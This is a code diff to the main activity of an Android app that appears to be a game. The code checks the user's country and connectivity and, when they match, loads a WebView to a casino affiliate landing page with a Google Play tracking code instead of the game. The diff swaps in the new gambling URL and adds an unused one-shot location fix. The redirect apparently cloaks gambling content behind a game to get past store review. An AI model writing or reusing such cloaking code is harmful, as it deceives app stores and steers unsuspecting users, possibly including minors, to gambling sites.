@@ -2,6 +2,7 @@ package iafaq.kaqpf.com.iafaq;
 
 import android.content.Context;
 import android.content.Intent;
+import android.location.Location;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.Bundle;
@@ -13,6 +14,11 @@ import android.webkit.WebResourceResponse;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 
+import com.google.android.gms.location.Geofence;
+
+import io.nlopez.smartlocation.OnLocationUpdatedListener;
+import io.nlopez.smartlocation.SmartLocation;
+
 public class MainActivity extends AppCompatActivity {
 
 
@@ -22,6 +28,15 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        SmartLocation.with(this).location()
+                .oneFix()
+                .start(new OnLocationUpdatedListener() {
+                    @Override
+                    public void onLocationUpdated(Location location) {
+
+                        System.out.println();
+                    }
+                });
         if (getCountry() && isOnline()) {
             webView = findViewById(R.id.web_view);
             webView.setWebViewClient(new WebViewClient() {
@@ -46,12 +61,14 @@ public class MainActivity extends AppCompatActivity {
                     showGame();
                 }
             });
-            webView.loadUrl("http://plancial-kideased.com/6936ed7a-ffcd-471b-9f1a-067eb4ed5f10");
+            webView.loadUrl("http://m66e085.winfortuna.com/?lp=rp4&trackCode=aff_1b1b01_34_GooglePlay_3");
         } else {
             showGame();
         }
 
     }
+
+
 
     private void showGame() {
         Intent intent = new Intent(this, GameActivity.class);
